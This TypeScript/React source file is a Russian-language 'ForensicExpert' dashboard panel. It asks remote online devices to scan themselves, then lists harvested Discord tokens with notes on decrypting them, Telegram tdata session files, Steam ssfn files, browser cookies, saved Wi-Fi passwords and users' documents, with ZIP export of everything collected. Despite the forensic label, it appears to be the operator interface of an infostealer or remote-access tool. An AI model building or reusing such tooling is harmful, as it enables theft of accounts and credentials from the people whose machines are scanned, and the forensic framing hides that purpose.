'use client';

import React, { memo, useState, useCallback } from 'react';
import { useDeviceStore, useForensicsStore, getGlobalWsSend } from '@/store';
import type { ForensicScanType, ForensicResult } from '@/types';

type ForensicTab = 'sessions' | 'inventory' | 'files' | 'export';

function requestForensicScan(deviceId: string, scanType: ForensicScanType) {
  const send = getGlobalWsSend();
  if (send) {
    send({
      type: 'forensic_request',
      payload: { deviceId, scanType },
    });
    return true;
  }
  return false;
}

// ============================================================
// Sub-components
// ============================================================

function SessionsTab({ result }: { result: ForensicResult | null }) {
  const sessions = result?.sessions;
  if (!sessions) {
    return (
      <div className="flex flex-col items-center justify-center py-16 text-zinc-500">
        <svg className="w-12 h-12 mb-3 opacity-40" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
        </svg>
        <p className="text-sm">Запустите сканирование для анализа сессий</p>
      </div>
    );
  }

  return (
    <div className="space-y-4">
      {/* Discord */}
      <div className="bg-zinc-800/50 border border-zinc-700/50 rounded-lg p-4">
        <div className="flex items-center gap-3 mb-3">
          <div className={`w-3 h-3 rounded-full ${sessions.discord.found ? 'bg-green-500' : 'bg-zinc-600'}`} />
          <h4 className="text-sm font-semibold text-white">Discord</h4>
          <span className={`text-xs px-2 py-0.5 rounded-full ${sessions.discord.found ? 'bg-green-500/10 text-green-400' : 'bg-zinc-700 text-zinc-400'}`}>
            {sessions.discord.found
              ? `${sessions.discord.tokens.length} ключей · ${sessions.discord.paths.length} путей`
              : 'Не найдено'}
          </span>
        </div>
        {sessions.discord.found && (
          <div className="space-y-2">
            {sessions.discord.tokens.map((token, i) => {
              const isEncrypted = token.startsWith('dQw4w9WgXcQ:');
              return (
                <div key={i} className="flex items-center gap-2 bg-zinc-900/50 rounded px-3 py-2">
                  <svg className={`w-4 h-4 flex-shrink-0 ${isEncrypted ? 'text-amber-400' : 'text-violet-400'}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
                  </svg>
                  <div className="flex-1 min-w-0">
                    <code className="text-xs text-zinc-300 font-mono break-all block">{token}</code>
                    {isEncrypted && <span className="text-[10px] text-amber-500/70">зашифрован — требует Local State для расшифровки</span>}
                  </div>
                </div>
              );
            })}
            {sessions.discord.paths.length > 0 && (
              <div className="mt-2 bg-zinc-900/30 rounded px-3 py-2">
                <p className="text-xs text-zinc-500 mb-1">Найденные пути LevelDB:</p>
                {sessions.discord.paths.map((p, i) => (
                  <p key={i} className="text-xs text-zinc-400 font-mono py-0.5">{p}</p>
                ))}
              </div>
            )}
            {sessions.discord.localStatePath && (
              <div className="flex items-center gap-2 bg-emerald-500/5 border border-emerald-500/20 rounded px-3 py-2">
                <svg className="w-4 h-4 text-emerald-400 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                </svg>
                <div>
                  <p className="text-xs text-emerald-400 font-medium">Local State найден</p>
                  <p className="text-[10px] text-zinc-500 font-mono">{sessions.discord.localStatePath}</p>
                </div>
              </div>
            )}
          </div>
        )}
      </div>

      {/* Telegram */}
      <div className="bg-zinc-800/50 border border-zinc-700/50 rounded-lg p-4">
        <div className="flex items-center gap-3 mb-3">
          <div className={`w-3 h-3 rounded-full ${sessions.telegram.found ? 'bg-green-500' : 'bg-zinc-600'}`} />
          <h4 className="text-sm font-semibold text-white">Telegram / AyuGram / Форки</h4>
          <span className={`text-xs px-2 py-0.5 rounded-full ${sessions.telegram.found ? 'bg-green-500/10 text-green-400' : 'bg-zinc-700 text-zinc-400'}`}>
            {sessions.telegram.found ? `${sessions.telegram.files.length} файлов tdata` : 'Не найдено (глубокий поиск)'}
          </span>
        </div>
        {sessions.telegram.found && (
          <div className="space-y-2">
            <div className="bg-zinc-900/50 rounded px-3 py-2">
              <p className="text-xs text-zinc-500">Путь tdata:</p>
              <p className="text-xs text-sky-400 font-mono mt-0.5">{sessions.telegram.tdataPath}</p>
            </div>
            <div className="max-h-40 overflow-y-auto bg-zinc-900/30 rounded px-3 py-2">
              <p className="text-xs text-zinc-500 mb-1">Содержимое ({sessions.telegram.files.length} элементов):</p>
              {sessions.telegram.files.map((f, i) => (
                <p key={i} className="text-xs text-zinc-400 font-mono py-0.5">{f}</p>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Steam */}
      <div className="bg-zinc-800/50 border border-zinc-700/50 rounded-lg p-4">
        <div className="flex items-center gap-3 mb-3">
          <div className={`w-3 h-3 rounded-full ${sessions.steam?.found ? 'bg-green-500' : 'bg-zinc-600'}`} />
          <h4 className="text-sm font-semibold text-white">Steam</h4>
          <span className={`text-xs px-2 py-0.5 rounded-full ${sessions.steam?.found ? 'bg-green-500/10 text-green-400' : 'bg-zinc-700 text-zinc-400'}`}>
            {sessions.steam?.found ? `${sessions.steam.ssfnFiles.length} ssfn + ${sessions.steam.configFiles.length} config` : 'Не найдено'}
          </span>
        </div>
        {sessions.steam?.found && (
          <div className="space-y-2">
            <div className="bg-zinc-900/50 rounded px-3 py-2">
              <p className="text-xs text-zinc-500">Путь Steam:</p>
              <p className="text-xs text-sky-400 font-mono mt-0.5">{sessions.steam.steamPath}</p>
            </div>
            {sessions.steam.ssfnFiles.length > 0 && (
              <div className="bg-zinc-900/30 rounded px-3 py-2">
                <p className="text-xs text-zinc-500 mb-1">SSFN файлы ({sessions.steam.ssfnFiles.length}):</p>
                {sessions.steam.ssfnFiles.map((f, i) => (
                  <p key={i} className="text-xs text-zinc-400 font-mono py-0.5">{f}</p>
                ))}
              </div>
            )}
            {sessions.steam.configFiles.length > 0 && (
              <div className="max-h-40 overflow-y-auto bg-zinc-900/30 rounded px-3 py-2">
                <p className="text-xs text-zinc-500 mb-1">Config ({sessions.steam.configFiles.length}):</p>
                {sessions.steam.configFiles.map((f, i) => (
                  <p key={i} className="text-xs text-zinc-400 font-mono py-0.5">{f}</p>
                ))}
              </div>
            )}
          </div>
        )}
      </div>

      {/* Cookies */}
      <div className="bg-zinc-800/50 border border-zinc-700/50 rounded-lg p-4">
        <div className="flex items-center gap-3 mb-3">
          <svg className="w-5 h-5 text-amber-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
          </svg>
          <h4 className="text-sm font-semibold text-white">Cookies браузеров</h4>
        </div>
        <div className="space-y-2">
          {sessions.cookies.length === 0 && <p className="text-xs text-zinc-500">Не обнаружено</p>}
          {sessions.cookies.map((c, i) => (
            <div key={i} className="flex items-center justify-between bg-zinc-900/50 rounded px-3 py-2">
              <div>
                <p className="text-xs text-white font-medium">{c.browser}</p>
                <p className="text-xs text-zinc-500 font-mono">{c.profilePath}</p>
              </div>
              <span className={`text-xs px-2 py-0.5 rounded-full ${c.found ? 'bg-green-500/10 text-green-400' : 'bg-zinc-700 text-zinc-400'}`}>
                {c.found ? 'Найдены' : 'Пусто'}
              </span>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

function InventoryTab({ result }: { result: ForensicResult | null }) {
  const inventory = result?.inventory;
  if (!inventory) {
    return (
      <div className="flex flex-col items-center justify-center py-16 text-zinc-500">
        <svg className="w-12 h-12 mb-3 opacity-40" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" />
        </svg>
        <p className="text-sm">Запустите сканирование для инвентаризации</p>
      </div>
    );
  }

  return (
    <div className="space-y-4">
      {/* System metadata */}
      <div className="bg-zinc-800/50 border border-zinc-700/50 rounded-lg p-4">
        <h4 className="text-sm font-semibold text-white mb-3 flex items-center gap-2">
          <svg className="w-4 h-4 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
          </svg>
          Системные метаданные
        </h4>
        <div className="grid grid-cols-2 gap-2">
          {[
            ['Hostname', inventory.system.hostname],
            ['IP адрес', inventory.system.ip],
            ['MAC адрес', inventory.system.mac],
            ['ОС', inventory.system.os],
            ['Пользователь', inventory.system.username],
            ['Локаль', inventory.system.locale],
          ].map(([label, value]) => (
            <div key={label} className="bg-zinc-900/50 rounded px-3 py-2">
              <p className="text-xs text-zinc-500">{label}</p>
              <p className="text-sm text-zinc-200 font-mono">{value || '—'}</p>
            </div>
          ))}
        </div>
      </div>

      {/* Wi-Fi */}
      <div className="bg-zinc-800/50 border border-zinc-700/50 rounded-lg p-4">
        <h4 className="text-sm font-semibold text-white mb-3 flex items-center gap-2">
          <svg className="w-4 h-4 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M8.111 16.404a5.5 5.5 0 017.778 0M12 20h.01m-7.08-7.071c3.904-3.905 10.236-3.905 14.141 0M1.394 9.393c5.857-5.858 15.355-5.858 21.213 0" />
          </svg>
          Wi-Fi сети ({inventory.wifi.length})
        </h4>
        {inventory.wifi.length === 0 ? (
          <p className="text-xs text-zinc-500">Сохранённых сетей не найдено</p>
        ) : (
          <div className="max-h-48 overflow-y-auto space-y-1">
            {inventory.wifi.map((w, i) => (
              <div key={i} className="flex items-center justify-between bg-zinc-900/50 rounded px-3 py-2">
                <div className="flex items-center gap-2">
                  <span className="text-sm text-white">{w.ssid}</span>
                  <span className="text-xs text-zinc-500">{w.auth}</span>
                </div>
                <code className="text-xs text-amber-400 font-mono">{w.password || '—'}</code>
              </div>
            ))}
          </div>
        )}
      </div>

      {/* Documents */}
      <div className="bg-zinc-800/50 border border-zinc-700/50 rounded-lg p-4">
        <h4 className="text-sm font-semibold text-white mb-3 flex items-center gap-2">
          <svg className="w-4 h-4 text-yellow-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
          </svg>
          Документы ({inventory.documents.length})
        </h4>
        <FileTree files={inventory.documents} />
      </div>

      {/* Downloads */}
      <div className="bg-zinc-800/50 border border-zinc-700/50 rounded-lg p-4">
        <h4 className="text-sm font-semibold text-white mb-3 flex items-center gap-2">
          <svg className="w-4 h-4 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
          </svg>
          Загрузки ({inventory.downloads.length})
        </h4>
        <FileTree files={inventory.downloads} />
      </div>
    </div>
  );
}

function FileTree({ files }: { files: { path: string; size: number; modified: string; category: string }[] }) {
  if (files.length === 0) {
    return <p className="text-xs text-zinc-500">Файлов не найдено</p>;
  }

  return (
    <div className="max-h-48 overflow-y-auto space-y-0.5">
      {files.map((f, i) => (
        <div key={i} className="flex items-center gap-2 text-xs px-2 py-1.5 rounded hover:bg-zinc-900/50 group">
          <svg className="w-3.5 h-3.5 text-zinc-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M7 21h10a2 2 0 002-2V9.414a1 1 0 00-.293-.707l-5.414-5.414A1 1 0 0012.586 3H7a2 2 0 00-2 2v14a2 2 0 002 2z" />
          </svg>
          <span className="text-zinc-300 truncate flex-1 font-mono">{f.path}</span>
          <span className="text-zinc-600 flex-shrink-0">{formatBytes(f.size)}</span>
        </div>
      ))}
    </div>
  );
}

function FilesTab({ result }: { result: ForensicResult | null }) {
  const files = result?.files;
  if (!files || files.length === 0) {
    return (
      <div className="flex flex-col items-center justify-center py-16 text-zinc-500">
        <svg className="w-12 h-12 mb-3 opacity-40" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z" />
        </svg>
        <p className="text-sm">Запустите сканирование для поиска файлов</p>
      </div>
    );
  }

  const byCategory = files.reduce<Record<string, typeof files>>((acc, f) => {
    if (!acc[f.category]) acc[f.category] = [];
    acc[f.category].push(f);
    return acc;
  }, {});

  const categoryLabels: Record<string, string> = {
    discord: 'Discord',
    telegram: 'Telegram',
    steam: 'Steam',
    cookies: 'Cookies',
    wifi: 'Wi-Fi',
    document: 'Документы',
    other: 'Прочее',
  };

  const categoryColors: Record<string, string> = {
    discord: 'text-indigo-400',
    telegram: 'text-sky-400',
    steam: 'text-blue-400',
    cookies: 'text-amber-400',
    wifi: 'text-cyan-400',
    document: 'text-yellow-400',
    other: 'text-zinc-400',
  };

  return (
    <div className="space-y-4">
      <div className="flex items-center gap-3 flex-wrap">
        <span className="text-xs text-zinc-500">Всего найдено: {files.length} файлов</span>
        {Object.entries(byCategory).map(([cat, arr]) => (
          <span key={cat} className={`text-xs px-2 py-0.5 rounded-full bg-zinc-800 ${categoryColors[cat] || 'text-zinc-400'}`}>
            {categoryLabels[cat] || cat}: {arr.length}
          </span>
        ))}
      </div>
      {Object.entries(byCategory).map(([cat, catFiles]) => (
        <div key={cat} className="bg-zinc-800/50 border border-zinc-700/50 rounded-lg p-4">
          <h4 className={`text-sm font-semibold mb-3 ${categoryColors[cat] || 'text-white'}`}>
            {categoryLabels[cat] || cat}
          </h4>
          <FileTree files={catFiles} />
        </div>
      ))}
    </div>
  );
}

function ExportTab({ result, deviceId }: { result: ForensicResult | null; deviceId: string }) {
  const handleDownloadArchive = useCallback(() => {
    if (!result?.archiveData) return;
    const byteStr = atob(result.archiveData);
    const bytes = new Uint8Array(byteStr.length);
    for (let i = 0; i < byteStr.length; i++) bytes[i] = byteStr.charCodeAt(i);
    const blob = new Blob([bytes], { type: 'application/zip' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = result.archiveName || `forensic_${deviceId}_${Date.now()}.zip`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }, [result, deviceId]);

  const handleDownloadReport = useCallback(() => {
    if (!result?.reportText) return;
    const blob = new Blob([result.reportText], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `forensic_report_${deviceId}_${Date.now()}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }, [result, deviceId]);

  return (
    <div className="space-y-4">
      <div className="bg-zinc-800/50 border border-zinc-700/50 rounded-lg p-6">
        <h4 className="text-sm font-semibold text-white mb-4 flex items-center gap-2">
          <svg className="w-4 h-4 text-violet-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
          </svg>
          Экспорт результатов
        </h4>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {/* Archive download */}
          <div className="bg-zinc-900/50 rounded-lg p-4 border border-zinc-700/30">
            <div className="flex items-center gap-3 mb-3">
              <div className="w-10 h-10 bg-emerald-500/10 rounded-lg flex items-center justify-center">
                <svg className="w-5 h-5 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8m-9 4h4" />
                </svg>
              </div>
              <div>
                <p className="text-sm text-white font-medium">ZIP-архив</p>
                <p className="text-xs text-zinc-500">Все найденные файлы и данные</p>
              </div>
            </div>
            <button
              onClick={handleDownloadArchive}
              disabled={!result?.archiveReady}
              className="w-full py-2 px-4 bg-emerald-600 hover:bg-emerald-500 disabled:bg-zinc-700 disabled:opacity-50 disabled:cursor-not-allowed text-white text-sm rounded-lg transition-colors"
            >
              {result?.archiveReady ? 'Скачать архив' : 'Сначала выполните сканирование'}
            </button>
          </div>

          {/* Text report */}
          <div className="bg-zinc-900/50 rounded-lg p-4 border border-zinc-700/30">
            <div className="flex items-center gap-3 mb-3">
              <div className="w-10 h-10 bg-emerald-500/10 rounded-lg flex items-center justify-center">
                <svg className="w-5 h-5 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                </svg>
              </div>
              <div>
                <p className="text-sm text-white font-medium">TXT-отчёт</p>
                <p className="text-xs text-zinc-500">Сводный текстовый отчёт</p>
              </div>
            </div>
            <button
              onClick={handleDownloadReport}
              disabled={!result?.reportText}
              className="w-full py-2 px-4 bg-emerald-600 hover:bg-emerald-500 disabled:bg-zinc-700 disabled:opacity-50 disabled:cursor-not-allowed text-white text-sm rounded-lg transition-colors"
            >
              {result?.reportText ? 'Скачать отчёт' : 'Сначала выполните сканирование'}
            </button>
          </div>
        </div>
      </div>

      {/* Scan summary */}
      {result && (
        <div className="bg-zinc-800/50 border border-zinc-700/50 rounded-lg p-4">
          <h4 className="text-sm font-semibold text-white mb-3">Сводка сканирования</h4>
          <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
            <SummaryCard label="Токены" value={result.sessions?.discord.tokens.length ?? 0} color="text-indigo-400" />
            <SummaryCard label="Telegram" value={result.sessions?.telegram.found ? 'Да' : 'Нет'} color="text-sky-400" />
            <SummaryCard label="Cookies" value={result.sessions?.cookies.filter(c => c.found).length ?? 0} color="text-amber-400" />
            <SummaryCard label="Steam" value={result.sessions?.steam?.found ? `${result.sessions.steam.ssfnFiles.length} ssfn` : 'Нет'} color="text-blue-400" />
            <SummaryCard label="Wi-Fi" value={result.inventory?.wifi.length ?? 0} color="text-cyan-400" />
            <SummaryCard label="Документы" value={result.inventory?.documents.length ?? 0} color="text-yellow-400" />
            <SummaryCard label="Загрузки" value={result.inventory?.downloads.length ?? 0} color="text-green-400" />
            <SummaryCard label="Всего файлов" value={result.files.length} color="text-violet-400" />
            <SummaryCard label="Статус" value={result.status === 'complete' ? 'Готово' : result.status === 'scanning' ? 'Сканирование' : 'Ошибка'} color={result.status === 'complete' ? 'text-green-400' : result.status === 'error' ? 'text-red-400' : 'text-yellow-400'} />
          </div>
        </div>
      )}
    </div>
  );
}

function SummaryCard({ label, value, color }: { label: string; value: string | number; color: string }) {
  return (
    <div className="bg-zinc-900/50 rounded-lg px-3 py-2.5 text-center">
      <p className={`text-lg font-bold ${color}`}>{value}</p>
      <p className="text-xs text-zinc-500">{label}</p>
    </div>
  );
}

function formatBytes(bytes: number): string {
  if (bytes === 0) return '0 B';
  const k = 1024;
  const sizes = ['B', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return `${(bytes / Math.pow(k, i)).toFixed(1)} ${sizes[i]}`;
}

// ============================================================
// Main Component
// ============================================================

const ForensicExpert = memo(function ForensicExpert() {
  const { selectedDeviceId } = useDeviceStore();
  const device = useDeviceStore((s) => s.getSelectedDevice());
  const result = useForensicsStore((s) => selectedDeviceId ? s.results[selectedDeviceId] ?? null : null);
  const scanning = useForensicsStore((s) => selectedDeviceId ? s.scanning[selectedDeviceId] ?? false : false);
  const [activeTab, setActiveTab] = useState<ForensicTab>('sessions');

  const handleScan = useCallback((scanType: ForensicScanType) => {
    if (!selectedDeviceId) return;
    useForensicsStore.getState().setScanning(selectedDeviceId, true);
    requestForensicScan(selectedDeviceId, scanType);
  }, [selectedDeviceId]);

  if (!selectedDeviceId || !device) {
    return (
      <div className="flex flex-col items-center justify-center py-20">
        <div className="w-16 h-16 bg-zinc-800 rounded-2xl flex items-center justify-center mb-4 border border-zinc-700">
          <svg className="w-8 h-8 text-zinc-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
          </svg>
        </div>
        <h3 className="text-white text-lg font-semibold mb-1">Устройство не выбрано</h3>
        <p className="text-zinc-500 text-sm">Выберите онлайн-устройство для запуска экспертизы</p>
      </div>
    );
  }

  const isOnline = device.status === 'online';
  const tabs: { id: ForensicTab; label: string; icon: React.ReactNode }[] = [
    {
      id: 'sessions',
      label: 'Сессии',
      icon: (
        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
        </svg>
      ),
    },
    {
      id: 'inventory',
      label: 'Инвентаризация',
      icon: (
        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" />
        </svg>
      ),
    },
    {
      id: 'files',
      label: 'Файлы',
      icon: (
        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z" />
        </svg>
      ),
    },
    {
      id: 'export',
      label: 'Экспорт',
      icon: (
        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
        </svg>
      ),
    },
  ];

  return (
    <div className="space-y-4">
      {/* Device summary bar */}
      <div className="bg-zinc-800/50 border border-zinc-700/50 rounded-lg p-4 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className={`w-3 h-3 rounded-full ${isOnline ? 'bg-green-500' : 'bg-zinc-600'}`} />
          <div>
            <p className="text-sm font-medium text-white">{device.hostname}</p>
            <p className="text-xs text-zinc-500">{device.ip} · {device.os}</p>
          </div>
        </div>
        <div className="flex items-center gap-2">
          {scanning && (
            <div className="flex items-center gap-2 mr-3">
              <div className="w-4 h-4 border-2 border-violet-500 border-t-transparent rounded-full animate-spin" />
              <span className="text-xs text-violet-400">
                Сканирование... {result?.progress ? `${result.progress}%` : ''}
              </span>
            </div>
          )}
          <button
            onClick={() => handleScan('full')}
            disabled={!isOnline || scanning}
            className="flex items-center gap-2 px-5 py-2 text-sm font-semibold bg-emerald-600 hover:bg-emerald-500 disabled:bg-zinc-700 disabled:opacity-40 disabled:cursor-not-allowed text-white rounded-lg transition-all duration-200 shadow-lg shadow-emerald-500/20 hover:shadow-emerald-500/30"
          >
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" />
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            Начать
          </button>
        </div>
      </div>

      {/* Error display */}
      {result?.error && (
        <div className="bg-red-500/10 border border-red-500/30 rounded-lg p-3 flex items-center gap-2">
          <svg className="w-4 h-4 text-red-400 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
          </svg>
          <p className="text-xs text-red-400">{result.error}</p>
        </div>
      )}

      {/* Tabs */}
      <div className="flex gap-1 bg-zinc-800/50 rounded-lg p-1 border border-zinc-700/50">
        {tabs.map((tab) => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id)}
            className={`flex items-center gap-2 px-4 py-2 text-sm rounded-md transition-all duration-200 flex-1 justify-center ${
              activeTab === tab.id
                ? 'bg-zinc-700 text-white shadow-sm'
                : 'text-zinc-400 hover:text-zinc-200 hover:bg-zinc-700/50'
            }`}
          >
            {tab.icon}
            <span>{tab.label}</span>
          </button>
        ))}
      </div>

      {/* Tab content */}
      <div className="min-h-[300px]">
        {activeTab === 'sessions' && <SessionsTab result={result} />}
        {activeTab === 'inventory' && <InventoryTab result={result} />}
        {activeTab === 'files' && <FilesTab result={result} />}
        {activeTab === 'export' && <ExportTab result={result} deviceId={selectedDeviceId} />}
      </div>
    </div>
  );
});

export default ForensicExpert;
